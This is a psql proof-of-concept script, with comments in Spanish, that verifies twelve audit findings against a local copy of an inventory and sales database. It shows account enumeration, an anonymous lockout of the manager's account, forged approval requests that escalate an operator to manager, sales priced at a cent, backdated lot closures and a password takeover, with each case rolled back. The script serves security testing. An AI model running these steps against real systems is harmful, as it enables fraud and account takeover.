-- Pruebas de concepto (PoC) de los hallazgos de la auditoría, sobre una copia local de la base.
-- Cada caso corre en su propia transacción y se revierte. Úselo SOLO en una base local o de prueba con el seed cargado.
-- Antes de la migración 20261124120000 cada ataque funciona; después, todos deben terminar en ERROR o en
-- «pendiente_aprobacion»: true.
\set QUIET on
\pset tuples_only on
\pset format unaligned

create or replace function pg_temp.como(p uuid) returns void language sql as $$
  select set_config('request.jwt.claims', json_build_object('sub', p, 'role', 'authenticated')::text, true),
         set_config('request.jwt.claim.sub', coalesce(p::text, ''), true);
$$;
grant execute on function pg_temp.como(uuid) to anon, authenticated;

\echo '=== PoC-01 · anon: el CI revela el correo (enumeración de cuentas)'
begin; set local role anon;
select public.correo_para_ingreso('5432109') as correo_del_gerente,
       public.correo_para_ingreso('1111111') as ci_inexistente;
rollback;

\echo '=== PoC-02 · anon: bloquear la cuenta del gerente sin conocer su contraseña'
begin; set local role anon;
select public.registrar_intento_fallido('gerencia@ensilados.demo') from generate_series(1, 3);
reset role;
select 'estado gerente = ' || estado || ', banned_until = ' || (select banned_until from auth.users where id = u.id)
  from public.usuarios u where correo = 'gerencia@ensilados.demo';
rollback;

\echo '=== PoC-03 · operador: solicitud forjada por INSERT directo (ajuste +500 rollos en un lote de OTRA sede)'
select id as lote_sj, producto_id as prod_sj, sede_id as sede_sj from public.lotes where codigo = 'L-SOY-261002-0009' \gset
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000021'); -- operador San Ramón
set local role authenticated;
with lote as (select :'lote_sj'::uuid as id, :'prod_sj'::uuid as producto_id, :'sede_sj'::uuid as sede_id)  -- lote de San Julián
insert into public.solicitudes_aprobacion (tipo, entidad, entidad_id, datos_propuestos, motivo, registrado_por, estado)
select 'ajuste', 'existencias', id,
       jsonb_build_object('producto_id', producto_id, 'lote_id', id, 'sede_id', sede_id, 'cantidad', 500,
                          'descripcion', 'Conteo físico'), 'Conteo físico', auth.uid(), 'pendiente' from lote;
reset role;
select 'solicitud forjada insertada por el operador: ' || count(*) from public.solicitudes_aprobacion where motivo = 'Conteo físico';
select 'disponible ANTES = ' || disponible from public.existencias e join public.lotes l on l.id = e.lote_id where l.codigo = 'L-SOY-261002-0009';
select pg_temp.como('a1000000-0000-4000-8000-000000000004'); -- gerente aprueba
set local role authenticated;
select public.resolver_solicitud((select id from public.solicitudes_aprobacion where motivo = 'Conteo físico'), true, 'ok');
reset role;
select 'disponible DESPUÉS = ' || disponible from public.existencias e join public.lotes l on l.id = e.lote_id where l.codigo = 'L-SOY-261002-0009';
rollback;

\echo '=== PoC-04 · operador: solicitud forjada para ascenderse a gerente general'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000021');
set local role authenticated;
insert into public.solicitudes_aprobacion (tipo, entidad, entidad_id, datos_propuestos, motivo, registrado_por, estado)
values ('rol_privilegiado', 'usuarios', auth.uid(), '{"rol_id": 5, "rol": "gerente_general", "usuario": "Juan Carlos Rivero"}',
        'Reemplazo temporal', auth.uid(), 'pendiente');
reset role;
select pg_temp.como('a1000000-0000-4000-8000-000000000004');
set local role authenticated;
select public.resolver_solicitud((select id from public.solicitudes_aprobacion where motivo = 'Reemplazo temporal'), true, 'ok');
reset role;
select 'rol del operador ahora = ' || r.codigo from public.usuarios u join public.roles r on r.id = u.rol_id
 where u.id = 'a1000000-0000-4000-8000-000000000021';
rollback;

\echo '=== PoC-05 · ejecutivo: pedido y detalle por INSERT directo a Bs 0,01 y despacho de rollos reservados para OTRO cliente'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000002');
set local role authenticated;
insert into public.pedidos (id, cliente_id, unidad_venta, estado, registrado_por)
values ('99999999-0000-0000-0000-000000000001', '88888888-8888-8888-8888-888888888883', 'rollo', 'pedido', auth.uid());
insert into public.pedido_detalle (pedido_id, lote_id, cantidad, rollos_equivalentes, precio_unitario)
select '99999999-0000-0000-0000-000000000001', id, 40, 40, 0.01 from public.lotes where codigo = 'L-SOR-260812-0007';
select 'nota: ' || public.emitir_nota_venta('99999999-0000-0000-0000-000000000001', 'contado', 0)::text;
reset role;
select 'reservado del lote ANTES = ' || reservado from public.existencias e join public.lotes l on l.id = e.lote_id where l.codigo = 'L-SOR-260812-0007';
select id as nota_falsa from public.notas_venta where pedido_id = '99999999-0000-0000-0000-000000000001' \gset
select id as lote_res from public.lotes where codigo = 'L-SOR-260812-0007' \gset
select pg_temp.como('a1000000-0000-4000-8000-000000000022'); -- operador San Julián
set local role authenticated;
select 'despacho: ' || public.registrar_despacho(:'nota_falsa', :'lote_res', array_fill(800::numeric, array[40]), 'ABC-123', 'Chofer X')::text;
reset role;
select 'reservado del lote DESPUÉS = ' || reservado from public.existencias e join public.lotes l on l.id = e.lote_id where l.codigo = 'L-SOR-260812-0007';
select 'cobrado de la nota falsa = ' || (total - saldo) || ' de ' || total from public.notas_venta where pedido_id = '99999999-0000-0000-0000-000000000001';
rollback;

\echo '=== PoC-06 · operador: cierre de orden con fecha retrocedida => lote apto sin fermentar'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000021');
set local role authenticated;
insert into public.ordenes_ensilado (id, sede_id, grano_id, fecha_apertura, estado, registrado_por)
values ('99999999-0000-0000-0000-000000000002', '22222222-2222-2222-2222-222222222222', 1, now(), 'abierta', auth.uid());
insert into public.pesajes (sede_id, origen, grano_id, placa, peso_bruto, tara, humedad, impurezas, orden_id, estado, fecha_dispositivo, registrado_por)
values ('22222222-2222-2222-2222-222222222222', 'propio', 1, 'ABC-999', 22000, 12000, 30, 1, '99999999-0000-0000-0000-000000000002', 'confirmado', now(), auth.uid());
select 'cierre: ' || (public.cerrar_orden('99999999-0000-0000-0000-000000000002', 10, now() - interval '60 days') ->> 'codigo');
select 'promovidos: ' || public.actualizar_lotes_aptos()::text;
reset role;
select 'lote ' || codigo || ' sellado ' || fecha_sellado || ' estado = ' || estado || ' (orden abierta hoy ' || current_date || ')'
  from public.lotes where orden_id = '99999999-0000-0000-0000-000000000002';
rollback;

\echo '=== PoC-07 · operador: cierre con rollos inflados (solo alerta, el stock entra igual)'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000021');
set local role authenticated;
insert into public.ordenes_ensilado (id, sede_id, grano_id, fecha_apertura, estado, registrado_por)
values ('99999999-0000-0000-0000-000000000003', '22222222-2222-2222-2222-222222222222', 1, now(), 'abierta', auth.uid());
insert into public.pesajes (sede_id, origen, grano_id, placa, peso_bruto, tara, humedad, impurezas, orden_id, estado, fecha_dispositivo, registrado_por)
values ('22222222-2222-2222-2222-222222222222', 'propio', 1, 'ABC-998', 13000, 12000, 14, 1, '99999999-0000-0000-0000-000000000003', 'confirmado', now(), auth.uid());
select public.cerrar_orden('99999999-0000-0000-0000-000000000003', 50000)::text;
rollback;

\echo '=== PoC-08 · operador: pesaje propio asociado a una orden de OTRA sede'
select id as orden_sr from public.ordenes_ensilado where sede_id = '22222222-2222-2222-2222-222222222222' and estado = 'cerrada' limit 1 \gset
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000022'); -- San Julián
set local role authenticated;
insert into public.pesajes (sede_id, origen, grano_id, placa, peso_bruto, tara, humedad, impurezas, orden_id, estado, fecha_dispositivo, registrado_por)
select '33333333-3333-3333-3333-333333333333', 'propio', 3, 'ZZZ-001', 90000, 12000, 14, 1, :'orden_sr', 'confirmado', now() - interval '400 days', auth.uid();
reset role;
select 'pesaje de San Julián en orden de San Ramón (' || o.estado || '), fecha_dispositivo ' || p.fecha_dispositivo::date
  from public.pesajes p join public.ordenes_ensilado o on o.id = p.orden_id where p.placa = 'ZZZ-001';
rollback;

\echo '=== PoC-09 · administrador: restablece la clave del gerente (toma de la cuenta que aprueba)'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000001');
set local role authenticated;
select public.restablecer_clave('a1000000-0000-4000-8000-000000000004', 'Tomada#2026x')::text;
reset role;
select 'la nueva clave del gerente la conoce el administrador: ' ||
       (encrypted_password = extensions.crypt('Tomada#2026x', encrypted_password))::text from auth.users where id = 'a1000000-0000-4000-8000-000000000004';
rollback;

\echo '=== PoC-10 · administrador: degrada al gerente a operador sin aprobación'
select id as gerente2 from public.usuarios where rol_id = 5 and id <> 'a1000000-0000-4000-8000-000000000004' limit 1 \gset
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000001');
set local role authenticated;
select public.editar_usuario(:'gerente2', 'Daniela Rocha Saucedo',
  (select ci from public.usuarios where id = :'gerente2'),
  (select correo from public.usuarios where id = :'gerente2'),
  'cajero_contador', '11111111-1111-1111-1111-111111111111')::text;
reset role;
select 'rol ahora = ' || r.codigo from public.usuarios u join public.roles r on r.id = u.rol_id where u.id = :'gerente2';
rollback;

\echo '=== PoC-11 · respaldo JSON omite filas que contienen la palabra superadmin'
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000002');
set local role authenticated;
insert into public.clientes (nit_ci, razon_social, tipo, limite_credito) values ('5550001', 'Ganadera Superadmin SRL', 'mayorista', 0);
reset role;
select pg_temp.como('a1000000-0000-4000-8000-000000000001');
set local role authenticated;
select jsonb_array_length(public.exportar_respaldo() #> '{tablas,clientes}') as en_respaldo \gset
reset role;
select 'clientes en la base = ' || (select count(*) from public.clientes) || ' · clientes en el respaldo = ' || :'en_respaldo';
rollback;

\echo '=== PoC-12 · nota al contado despachada sin ningún cobro'
select 'nota ' || n.numero || ' contado, saldo Bs ' || n.saldo || ', rollos despachados ' || coalesce(sum(d.cantidad), 0)
  from public.notas_venta n left join public.despachos d on d.nota_venta_id = n.id
 where n.condicion_pago = 'contado' and n.saldo > 0 group by n.numero, n.saldo;
begin;
select pg_temp.como('a1000000-0000-4000-8000-000000000002');
set local role authenticated;
select 'nota contado nueva: ' || (public.emitir_nota_venta((public.registrar_pedido('88888888-8888-8888-8888-888888888881', 'rollo',
   '[{"producto_id":"cccccccc-cccc-cccc-cccc-cccccccccccc","cantidad":3}]') ->> 'pedido_id')::uuid, 'contado', 0) ->> 'estado');
reset role;
select n.id as nota_c, d.lote_id as lote_c, e.sede_id as sede_c from public.notas_venta n join public.pedido_detalle d on d.pedido_id = n.pedido_id
  join public.existencias e on e.lote_id = d.lote_id and e.reservado > 0
 where n.condicion_pago = 'contado' order by n.numero desc limit 1 \gset
select 'operador de la sede del lote: ' || id as x, id as op_c from public.usuarios where sede_id = :'sede_c' and rol_id = 2 limit 1 \gset
select pg_temp.como(:'op_c');
set local role authenticated;
select 'despacho sin cobro: ' || (public.registrar_despacho(:'nota_c', :'lote_c', array[800,800,800]::numeric[], 'XYZ-777', 'Chofer Y') ->> 'estado');
reset role;
select 'saldo de la nota despachada = Bs ' || saldo || ' de ' || total from public.notas_venta where id = :'nota_c';
rollback;
